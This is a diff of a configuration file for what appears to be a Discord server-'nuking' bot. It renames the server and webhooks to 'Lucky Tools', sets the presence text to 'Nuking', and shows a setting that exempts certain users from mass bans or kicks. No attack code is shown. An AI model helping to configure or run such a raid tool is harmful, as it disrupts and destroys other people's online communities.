@@ -12,13 +12,13 @@ EMBED_CONFIG = {
 }
 
 SERVER_CONFIG = {
-    "new_name": "",  # New Server Name here 
+    "new_name": "Lucky Tools",  # New Server Name here 
     "new_icon": "",   # New Server Icon url here → https://image.jpg 
-    "new_description": "",  # New Server Description here 
+    "new_description": "67",  # New Server Description here 
 }
 
 WEBHOOK_CONFIG = {
-    "default_name": "Nebula",  # Webhook Name here 
+    "default_name": "LuckyTools",  # Webhook Name here 
 }
 
 
@@ -38,5 +38,6 @@ NO_BAN_KICK_ID = {
 
 BOT_PRESENCE = {
     "type": "playing",  # "playing", "listening", or "watching"
-    "text": "Nebula"  # Your text presence
+    "text": "Nuking"  # Your text presence
 }
+
